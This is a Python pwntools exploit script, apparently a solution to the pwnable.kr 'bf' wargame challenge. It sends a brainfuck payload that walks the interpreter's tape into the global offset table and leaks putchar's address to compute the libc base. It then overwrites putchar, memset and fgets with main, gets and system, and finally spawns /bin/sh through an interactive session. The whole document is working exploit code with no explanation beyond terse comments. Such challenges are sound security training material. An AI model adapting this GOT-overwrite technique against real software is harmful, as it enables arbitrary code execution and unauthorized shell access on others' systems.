from pwn import *

if __debug__:
	script='''b main
	c
	'''
	# p=gdb.debug('./bf',script)
	p=process('./bf')
else:
	p=remote('pwnable.kr',9001)

p.recvline()
p.recvline()

e_bf=ELF('./bf')
e_so=ELF('./bf_libc.so')

# tape=0x804a0a0
# main=0x8048671
# putchar_got=0x804a030
# memset_got=0x804a02c
# fgets_got=0x804a010
# putchar_index=0xf7e44920
# system_index=0xf7e18200
# gets_index=0xf7e422b0

tape=e_bf.symbols['tape']
main=e_bf.symbols['main']
putchar_got=e_bf.got['putchar']
memset_got=e_bf.got['memset']
fgets_got=e_bf.got['fgets']
putchar_index=e_so.symbols['putchar']
system_index=e_so.symbols['system']
gets_index=e_so.symbols['gets']

payload='.'  #set putchar got
payload+='<'*(tape-putchar_got)+'>>>.<.<.<.'    #leak putchar address
payload+=',>,>,>,<<<'	#overwrite putchar to main
payload+='<'*(putchar_got-memset_got)+',>,>,>,<<<' #overwrite memset to gets
payload+='<'*(memset_got-fgets_got)+',>,>,>,<<<'	#overwrite fgets to system
payload+='.'	#call main

p.sendline(payload)

p.recv(1)	#set putchar got
putchar_addr=int(p.recv(4).encode('hex'),16)	#leak putchar address

libc=putchar_addr-putchar_index
print('libc = '+hex(libc))
system_addr=libc+system_index
gets_addr=libc+gets_index	

p.send(p32(main))	#overwrite main
p.send(p32(gets_addr))
p.send(p32(system_addr))
p.send("/bin/sh\x00")

p.interactive()
p.close()